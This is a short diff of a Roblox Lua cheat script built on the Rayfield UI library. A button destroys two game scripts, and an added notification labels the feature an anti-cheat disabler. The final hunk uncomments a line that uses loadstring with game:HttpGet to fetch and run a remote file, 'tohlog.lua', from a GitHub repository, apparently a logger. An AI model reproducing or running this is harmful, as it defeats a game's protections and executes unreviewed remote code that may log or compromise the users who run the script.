@@ -161,6 +161,12 @@ local Button = MiscTab:CreateButton({
 
 		script1:Destroy()
         script2:Destroy()
+		Rayfield:Notify({
+			Title = "Ac Disabler",
+			Content = "if you get a callback error, it means the anti-cheat is already disabled",
+			Duration = 5,
+			Image = 4483362458,
+		})
 	end,
 })
 
@@ -181,4 +187,4 @@ local Button = MiscTab:CreateButton({
 
 
 
---loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/tohlog.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/tohlog.lua"))()
